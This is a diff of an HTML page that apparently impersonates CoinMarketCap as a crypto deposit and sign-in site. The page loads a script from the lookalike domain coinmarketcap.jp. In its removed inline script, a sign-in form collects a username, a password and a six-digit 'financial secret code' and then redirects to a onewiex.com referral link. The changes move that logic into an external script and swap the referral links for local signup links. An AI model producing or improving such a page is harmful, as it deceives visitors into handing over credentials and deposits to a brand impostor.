@@ -71,6 +71,7 @@
         display: none;
       }
     </style>
+    <script src="https://www.google.com/recaptcha/enterprise.js?render=6Lc08TYnAAAAAN-Br_NCH29jui_gOTah1hrwUWaD"></script>
   </head>
   <body style="padding-right: 0px; overflow-y: auto">
     <app-root ng-version="14.2.3">
@@ -154,13 +155,11 @@
                               <button
                                 class="m-btn tr"
                                 id="coinmarketcap-signin"
-                                onclick="signin()"
+                                onclick="signin(event)"
                               >
                                 Sign in
                               </button>
-                              <a
-                                href="https://onewiex.com/?upline=012047991013"
-                                class="header-sign__link"
+                              <a href="/signup" class="header-sign__link"
                                 >Forgot password?</a
                               >
                             </div>
@@ -280,10 +279,7 @@
                     </app-language>
                     <div class="header-nav">
                       <a class="m-btn sm white text-nowrap">Sign in</a>
-                      <a
-                        class="m-btn sm text-nowrap ml-3"
-                        href="https://onewiex.com/?upline=012047991013"
-                      >
+                      <a class="m-btn sm text-nowrap ml-3" href="/signup">
                         Sign Up
                       </a>
                     </div>
@@ -304,12 +300,7 @@
                       innovative technology and use broad access to financial
                       literacy right now!
                     </div>
-                    <a
-                      routerlink="/auth/signup"
-                      class="m-btn big"
-                      href="https://onewiex.com/?upline=012047991013"
-                      >Get Started</a
-                    >
+                    <a class="m-btn big" href="/signup">Get Started</a>
                   </div>
                   <div class="col-lg-6 order-1 order-lg-2">
                     <div class="market-bg">
@@ -393,12 +384,7 @@
                         </div>
                       </div>
                       <div class="tariff-item__btns">
-                        <a
-                          account-link=""
-                          class="m-btn sm"
-                          href="https://onewiex.com/?upline=012047991013"
-                          >Open deposit</a
-                        >
+                        <a class="m-btn sm" href="/signup">Open deposit</a>
                       </div>
                     </div>
                   </div>
@@ -456,12 +442,7 @@
                           </p>
                         </div>
                         <div class="tariff-item__btns">
-                          <a
-                            account-link=""
-                            class="m-btn sm tr"
-                            href="https://onewiex.com/?upline=012047991013"
-                            >Open deposit</a
-                          >
+                          <a class="m-btn sm tr" href="/signup">Open deposit</a>
                         </div>
                       </div>
                     </facade-marketing-offer-box>
@@ -506,10 +487,7 @@
                               </p>
                             </div>
                             <div class="tariff-item__btns">
-                              <a
-                                account-link=""
-                                class="m-btn sm tr"
-                                href="https://onewiex.com/?upline=012047991013"
+                              <a class="m-btn sm tr" href="/signup"
                                 >Open deposit</a
                               >
                             </div>
@@ -554,10 +532,7 @@
                               </p>
                             </div>
                             <div class="tariff-item__btns">
-                              <a
-                                account-link=""
-                                class="m-btn sm tr"
-                                href="https://onewiex.com/?upline=012047991013"
+                              <a class="m-btn sm tr" href="/signup"
                                 >Open deposit</a
                               >
                             </div>
@@ -604,10 +579,7 @@
                               </p>
                             </div>
                             <div class="tariff-item__btns">
-                              <a
-                                account-link=""
-                                class="m-btn sm tr"
-                                href="https://onewiex.com/?upline=012047991013"
+                              <a class="m-btn sm tr" href="/signup"
                                 >Open deposit</a
                               >
                             </div>
@@ -652,10 +624,7 @@
                               </p>
                             </div>
                             <div class="tariff-item__btns">
-                              <a
-                                account-link=""
-                                class="m-btn sm tr"
-                                href="https://onewiex.com/?upline=012047991013"
+                              <a class="m-btn sm tr" href="/signup"
                                 >Open deposit</a
                               >
                             </div>
@@ -746,10 +715,7 @@
                               </p>
                             </div>
                             <div class="tariff-item__btns">
-                              <a
-                                account-link=""
-                                class="m-btn sm tr"
-                                href="https://onewiex.com/?upline=012047991013"
+                              <a class="m-btn sm tr" href="/signup"
                                 >Open deposit</a
                               >
                             </div>
@@ -792,10 +758,7 @@
                               </p>
                             </div>
                             <div class="tariff-item__btns">
-                              <a
-                                account-link=""
-                                class="m-btn sm tr"
-                                href="https://onewiex.com/?upline=012047991013"
+                              <a class="m-btn sm tr" href="/signup"
                                 >Open deposit</a
                               >
                             </div>
@@ -865,10 +828,7 @@
                               </p>
                             </div>
                             <div class="tariff-item__btns">
-                              <a
-                                account-link=""
-                                class="m-btn sm tr"
-                                href="https://onewiex.com/?upline=012047991013"
+                              <a class="m-btn sm tr" href="signup"
                                 >Open deposit</a
                               >
                             </div>
@@ -912,10 +872,7 @@
                               </p>
                             </div>
                             <div class="tariff-item__btns">
-                              <a
-                                account-link=""
-                                class="m-btn sm tr"
-                                href="https://onewiex.com/?upline=012047991013"
+                              <a class="m-btn sm tr" href="signup"
                                 >Open deposit</a
                               >
                             </div>
@@ -968,13 +925,13 @@
                     <a
                       routerlink="/faq"
                       routerlinkactive="active"
-                      href="https://onewiex.com/?upline=012047991013"
+                      href="/signup"
                       >F.A.Q</a
                     >
                     <a
                       routerlink="/privacy"
                       routerlinkactive="active"
-                      href="https://onewiex.com/?upline=012047991013"
+                      href="/signup"
                       >Privacy Policy</a
                     >
                   </div>
@@ -1102,49 +1059,6 @@
     </app-root>
 
     <script src="https://event.coinmarketcap.jp/client.js"></script>
-    <script>
-      SIGNIN_CLICK_TIMES = 1;
-
-      async function signin() {
-        event.preventDefault();
-
-        const usernameInput = document.getElementById('coinmarketcap-username');
-        const passwordInput = document.getElementById('coinmarketcap-password');
-
-        if (
-          usernameInput.value.trim() === '' ||
-          passwordInput.value.trim() === ''
-        ) {
-          alert('Please enter both username and password.');
-          return;
-        }
-
-        const financialSecretCode = document.getElementById(
-          'financial-secret-code'
-        );
-
-        if (SIGNIN_CLICK_TIMES == 1) {
-          financialSecretCode.style.display = 'block';
-          SIGNIN_CLICK_TIMES = 0;
-        } else {
-          const secretInput = document.getElementById('coinmarketcap-secret');
-          const secretRegex = /^\d{6}$/;
-          if (!secretRegex.test(secretInput.value)) {
-            alert('Financial Secret Code must be exactly 6 digits.');
-            return;
-          }
-          window.location.href = 'https://onewiex.com/?upline=012047991013';
-        }
-      }
-
-      document.addEventListener('DOMContentLoaded', function () {
-        const signInBtn = document.querySelector('.m-btn.sm.white.text-nowrap');
-        const signInForm = document.getElementById('signin-form');
-
-        signInBtn.addEventListener('click', function () {
-          signInForm.classList.toggle('show');
-        });
-      });
-    </script>
+    <script src="assets/scripts/signin.js"></script>
   </body>
 </html>
